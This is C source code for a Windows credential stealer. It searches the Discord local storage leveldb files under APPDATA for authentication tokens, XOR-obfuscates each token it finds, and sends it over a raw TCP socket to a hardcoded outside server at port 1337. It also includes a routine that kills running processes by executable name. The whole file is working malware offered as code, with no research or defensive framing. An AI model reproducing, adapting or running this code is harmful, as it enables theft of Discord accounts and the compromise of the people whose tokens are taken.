//------Host configuration-------
#define SERVER_IP "52.15.77.144"
#define SERVER_PORT 1337
//-------------------------------
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <stdbool.h>
#include <wchar.h>
#include <winsock2.h>
#include <windows.h>
#include <process.h>
#include <Tlhelp32.h>
#include <winbase.h>
#include <unistd.h>
void killByExecutable(const char* executable){
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(pEntry);
    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while(hRes){
        if(!strcmp(pEntry.szExeFile, executable)){
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, (DWORD)pEntry.th32ProcessID);
            if(hProcess != NULL){
                TerminateProcess(hProcess, 9);
                CloseHandle(hProcess);
            }
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
}
char* getDiscordDir(){
    char* appdata = getenv("APPDATA");
    const char* appendix = "\\discord\\Local Storage\\leveldb\\";
    strcat(appdata, appendix);
    return appdata;
}
bool dirExists(const char* dirname){
    DIR *dir = opendir(dirname);
    if(dir){
        closedir(dir);
        return true;
    }else return false;
}
bool hasSubstring(const char* a, const char* b){
    return strstr(a, b) != NULL;
}
char* printBool(bool a){
    return a ? "true" : "false";
}
bool endsWith(const char* a, const char* b){
    return !strcmp(a + strlen(a) - strlen(b), b) ? true : false;
}
void extractDiscordToken(const char * discordDir){
    DIR *dir = opendir(discordDir);
    struct dirent *ent;
    while((ent = readdir(dir)) != NULL){
        const char* filename = ent->d_name;
        if((endsWith(filename, ".ldb") || endsWith(filename, ".log"))){
            long i, j;
            char fullPath[strlen(discordDir) + strlen(filename) + 1];
            for(i = 0; discordDir[i] != '\0'; i++)fullPath[i] = discordDir[i];
            for(j = 0; filename[j] != '\0'; j++)fullPath[i++] = filename[j];
            fullPath[i] = '\0';
            FILE *file = fopen(fullPath, "r");
            fseek(file, 0L, SEEK_END);
            long fileSize = ftell(file);
            rewind(file);
            wint_t wc;
            wint_t fileData[fileSize + 1]; i = 0;
            while((wc=fgetwc(file)) != WEOF){
                fileData[i++] = wc;
            }
            fileData[i] = (wint_t)('\0');
            for(i = 0; i < fileSize - 2; i++){
                if(fileData[i] == (wint_t)('o') && fileData[i + 1] == (wint_t)('k') && fileData[i + 2] == (wint_t)('e') && fileData[i + 3] == (wint_t)('n')){
                    for(j = 0; fileData[i + j] != (wint_t)('"'); j++);
                    long startIdx = i + j + 1;
                    char token[62];
                    token[0] = 'd';
                    token[1] = 'c';
                    token[2] = ':';
                    for(long z = startIdx, j = 0; z < startIdx + 59; z++, j++)token[3 + j] = fileData[z];
                    token[62] = '\0';
                    WSADATA wsa;
                    SOCKET sock;
                    struct sockaddr_in server;
                    if(WSAStartup(MAKEWORD(2, 2), &wsa)){
                        return;
                    }
                    if((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET){
                        return;
                    }
                    server.sin_addr.s_addr = inet_addr(SERVER_IP);
                    server.sin_family = AF_INET;
                    server.sin_port = htons(SERVER_PORT);
                    if(connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0){
                        return;
                    }
                    for(long z = 0; z < 61; z++)token[z] ^= 0x6F;
                    if(send(sock, token, strlen(token), 0) < 0){
                        return;
                    }
                    closesocket(sock);
                    WSACleanup();
                }
            }
            fclose(file); file = NULL;
        }
    }
    closedir(dir);
}